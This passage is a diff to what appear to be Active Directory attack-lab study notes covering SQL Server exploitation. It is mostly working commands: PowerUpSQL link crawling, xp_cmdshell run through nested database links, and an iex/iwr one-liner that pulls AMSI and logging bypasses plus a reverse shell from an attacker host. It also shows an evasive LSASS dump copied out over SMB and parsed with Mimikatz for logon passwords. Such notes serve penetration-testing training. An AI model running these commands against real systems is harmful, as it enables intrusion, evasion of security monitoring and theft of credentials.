@@ -1670,60 +1670,142 @@ Resource enumeration note: Must attempt TGS request for each suspected service/r
 
 ## SECTION 7: SQL SERVER EXPLOITATION
 
-### Database Link Enumeration
+### Initial SQL Server Discovery
+
+```powershell
+# Import PowerUpSQL
+Import-Module C:\AD\Tools\PowerUpSQL-master\PowerupSQL.psd1
+
+# Enumerate all SQL instances and attempt connections
+Get-SQLInstanceDomain | Get-SQLServerinfo -Verbose
+
+# Output shows which instances can be accessed (Connection Success)
+# Example: dcorp-mssql.dollarcorp.moneycorp.local (not sysadmin)
+```
+
+### Database Link Chain Enumeration
+
+**Step 1: Enumerate direct links via SQL**
 ```sql
--- List linked servers
+-- List all linked servers on current instance
 select * from master..sysservers
 
--- Query through link
-select * from openquery("LINKED_SERVER", 'select @@servername')
+-- Enumerate links from specific server
+select * from openquery("DCORP-SQL1",'select * from master..sysservers')
 
--- Test xp_cmdshell availability
-select * from openquery("LINKED_SERVER", 'select @@version')
+-- Nested openquery chains through multiple hops
+select * from openquery("DCORP-SQL1",
+  'select * from openquery("DCORP-MGMT",
+    ''select * from master..sysservers'')')
 ```
 
-### Automated Link Crawling
+**Step 2: PowerUpSQL automatic link crawling (RECOMMENDED)**
 ```powershell
-# PowerUpSQL automated crawling
-Get-SQLServerLinkCrawl -Instance dcorp-mssql.domain.com -Verbose
+# Run with verbose to see entire link chain
+Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Verbose
 
-# Output:
-# Server: DCORP-MSSQL (StudentX, not sysadmin)
-#   → Links to: DCORP-SQL1
-# Server: DCORP-SQL1 (dblinkuser, not sysadmin)
-#   → Links to: DCORP-MGMT
-# Server: DCORP-MGMT (sqluser, not sysadmin)
-#   → Links to: eu-sqlx.eu.eurocorp.local
-# Server: eu-sqlx (sa, SYSADMIN!)
-#   → No further links
+# Typical output shows:
+# DCORP-MSSQL → dcorp\studentx (not sysadmin) → links to DCORP-SQL1
+# DCORP-SQL1 → dblinkuser (not sysadmin) → links to DCORP-MGMT
+# DCORP-MGMT → sqluser (not sysadmin) → links to eu-sqlx.eu.eurocorp.local
+# eu-sqlx → sa (SYSADMIN = 1) → no further links
+
+# The goal: Find a path where final server has sysadmin rights
 ```
 
-### Command Execution Through Links
-```powershell
-# Direct nested query (complex escaping)
+### Command Execution Through Database Links
+
+**Option 1: Direct nested SQL queries (complex escaping)**
+```sql
 select * from openquery("DCORP-SQL1",
   'select * from openquery("DCORP-MGMT",
     ''select * from openquery("eu-sqlx",
       ''''exec master..xp_cmdshell "whoami"'''')'')')
+```
 
-# PowerUpSQL automated approach (RECOMMENDED)
+**Option 2: PowerUpSQL with single command (RECOMMENDED)**
+```powershell
+# Verify xp_cmdshell works and we have context
 Get-SQLServerLinkCrawl -Instance dcorp-mssql 
-  -Query 'exec master..xp_cmdshell "whoami"' 
+  -Query "exec master..xp_cmdshell 'set username'" 
+  -QueryTarget eu-sqlx
+
+# Output should show USERNAME=sa (or other sysadmin account)
+```
+
+### Reverse Shell Through Database Links
+
+**Step 1: Host bypass scripts and shell**
+
+On attacker machine (172.16.100.x):
+```
+sbloggingbypass.txt    - Script Logging Bypass
+Amsi-Byp.txt           - AMSI Bypass
+Invoke-PowerShellTcpEx.ps1 - Reverse shell with callback at end
+```
+
+**Step 2: Start reverse shell listener**
+```powershell
+C:\AD\Tools> nc64.exe -lvp 443
+# listening on [any] 443
+```
+
+**Step 3: Execute reverse shell through SQL link**
+```powershell
+Get-SQLServerLinkCrawl -Instance dcorp-mssql 
+  -Query 'exec master..xp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://172.16.100.x/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://172.16.100.x/Amsi-Byp.txt);iex (iwr -UseBasicParsing http://172.16.100.x/Invoke-PowerShellTcpEx.ps1)"''' 
+  -QueryTarget eu-sqlx
+
+# Listener will receive connection from eu-sqlx running as SYSTEM
+```
+
+### Persistence Through LSASS Dumping
+
+**Context: Already have SYSTEM access on remote SQL server (eu-sqlx)**
+
+**Step 1: Host minidump tools on SMB share**
+
+On attacker machine, create share (\\dcorp-studentx\studentsharex):
+```
+minidumpdotnet.dll  - Custom LSASS dump DLL (AV/MDE evasive)
+mini.ps1            - Script to execute minidumpdotnet.dll
+reverse.exe         - Utility to reverse dump file byte order
+```
+
+Grant Everyone read/write permissions on share.
+
+**Step 2: Execute LSASS dump on remote SQL server**
+```powershell
+# Copy mini.ps1 to target
+Get-SQLServerLinkCrawl -Instance dcorp-mssql 
+  -Query 'exec master..xp_cmdshell ''xcopy \\dcorp-stdx.dollarcorp.moneycorp.local\studentsharex\mini.ps1 C:\Users\Public''' 
+  -QueryTarget eu-sqlx
+
+# Execute the dump script (downloads minidumpdotnet.dll from HFS server)
+Get-SQLServerLinkCrawl -Instance dcorp-mssql 
+  -Query 'exec master..xp_cmdshell ''powershell C:\Users\Public\mini.ps1''' 
+  -QueryTarget eu-sqlx
+
+# Output: reverse.dmp created in C:\Users\Public
+```
+
+**Step 3: Retrieve dump file**
+```powershell
+Get-SQLServerLinkCrawl -Instance dcorp-mssql 
+  -Query 'exec master..xp_cmdshell ''xcopy C:\Users\Public\reverse.dmp \\dcorp-stdx.dollarcorp.moneycorp.local\studentsharex\''' 
   -QueryTarget eu-sqlx
 ```
 
-### Reverse Shell Delivery Through SQL
+**Step 4: Process dump locally**
 ```powershell
-# Prepare reverse shell script on attacker web server
-# Content: Invoke-PowerShellTcp -Reverse -IPAddress 172.16.100.x -Port 443
+# Run locally on attacker machine
+C:\AD\Tools\Reverse.exe "C:\AD\Tools\studentsharex\reverse.dmp" "C:\AD\Tools\studentsharex\reversex.dmp"
 
-# Deliver through SQL link
-Get-SQLServerLinkCrawl -Instance dcorp-mssql 
-  -Query 'exec master..xp_cmdshell 
-    ''powershell -c "iex (iwr http://172.16.100.x/shell.ps1)"''' 
-  -QueryTarget eu-sqlx
+# Output: reversex.dmp (byte-reversed version)
 
-# Listener captures shell from eu-sqlx as SYSTEM
+# Extract credentials using Mimikatz (from elevated shell)
+mimikatz # sekurlsa::minidump C:\AD\Tools\studentsharex\reversex.dmp
+mimikatz # sekurlsa::logonPasswords
 ```
 
 ---
